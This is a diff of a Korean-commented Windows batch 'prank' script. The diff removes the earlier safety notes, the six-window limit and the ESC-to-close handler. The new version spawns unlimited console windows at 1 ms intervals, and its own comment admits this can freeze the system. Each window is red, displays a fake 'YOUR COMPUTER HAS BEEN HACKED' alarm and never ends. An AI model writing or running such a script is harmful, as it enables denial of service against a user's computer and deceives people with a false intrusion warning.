@@ -1,75 +1,50 @@
 @echo off
-rem =========================
-rem 안전 설명:
-rem 이 스크립트는 부모 창 1개 + 자식 창 N개를 띄웁니다.
-rem 자식 창은 혼란스러운 메시지를 계속 출력하고,
-rem 부모 창에서 ESC를 누르면 모든 자식 창이 한꺼번에 종료됩니다.
-rem =========================
-
 setlocal enabledelayedexpansion
 
-rem 자식 창 개수 (원하면 변경)
-set "CHILD_COUNT=6"
+:: 몇 개 창 띄울지 (0 = 무제한)
+set "MAX_TOTAL=0"
 
-rem 자식 창 타이틀 (taskkill 식별용)
-set "CHILD_TITLE=PRANK_CHILD_WINDOW"
+:: 창 생성 속도 (밀리초) → 너무 낮추면 시스템이 멈출 수 있음
+set "SPAWN_DELAY_MS=1"
 
-rem 부모/자식 구분
+:: 자식 창 타이틀
+set "TITLE_PREFIX=PRANK_CMD_"
+
 if /I "%1"=="child" goto :child_mode
 
-:: -------------------------
 :: 부모 모드
-:: -------------------------
 cls
-echo Starting %CHILD_COUNT% child windows...
-:loop
- start "%CHILD_TITLE%" cmd /c "%~f0 child"
-    ping 127.0.0.1 -n 1 -w 100 > nul
-goto loop
+echo ========================================
+echo   CMD prank spawner
+echo   MAX_TOTAL=%MAX_TOTAL%
+echo   SPAWN_DELAY_MS=%SPAWN_DELAY_MS% ms
+echo ========================================
+pause
 
-echo.
-echo ==============================================
-echo  Press ESC in this window to close ALL others
-echo ==============================================
-echo.
+set /a CNT=0
+:spawn_loop
+if "%MAX_TOTAL%" NEQ "0" if !CNT! GEQ %MAX_TOTAL% goto :done
 
-:: ESC 키 감지 (PowerShell 이용)
-:wait_esc
-powershell -NoProfile -Command ^
-  "while($true){ if($Host.UI.RawUI.KeyAvailable){ $k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($k.VirtualKeyCode -eq 27){ exit 0 } } Start-Sleep -Milliseconds 100 }"
+set /a CNT+=1
+start "" cmd /k "%~f0 child !CNT!"
+ping 127.0.0.1 -n 1 -w %SPAWN_DELAY_MS% > nul
+goto :spawn_loop
 
-if errorlevel 0 (
-    echo ESC detected — closing child windows...
-    taskkill /FI "WINDOWTITLE eq %CHILD_TITLE%" /T /F > nul 2>&1
-    echo Done.
-)
+:done
+echo Done spawning %CNT% windows.
 exit /b
 
-:: -------------------------
-:: 자식 모드
-:: -------------------------
 :child_mode
-title %CHILD_TITLE%
+set "IDX=%2"
+title %TITLE_PREFIX%%IDX%
 color 4F
-mode con: cols=100 lines=25
+mode con: cols=50 lines=20
 cls
 
-setlocal enabledelayedexpansion
-set "T1=YOUR COMPUTER HAS BEEN HACKED! "
-set "T2=SYSTEM FAILURE! PANIC! CHAOS! RUN! ALERT! "
-set "T3=FILES CORRUPTED! SYSTEM OVERLOAD! WARNING! "
-set "T4=THIS IS NOT A DRILL! HACKED! HACKED! HACKED! "
-set "LINE=!T1!!T2!!T3!!T4!"
-
-:child_loop
-cls
-for /L %%i in (0,1,9999) do (
-    set "ch=!LINE:~%%i,1!"
-    if "!ch!"=="" goto :child_done
-    <nul set /p ="!ch!"
-    ping 127.0.0.1 -n 1 -w 15 > nul
-)
-:child_done
 echo.
-ping 127.0.0.1 -n 1 > nul
-goto :child_loop
+echo              YOUR COMPUTER HAS BEEN HACKED
+echo.
+
+:loop
+timeout /t 60 >nul
+goto :loop
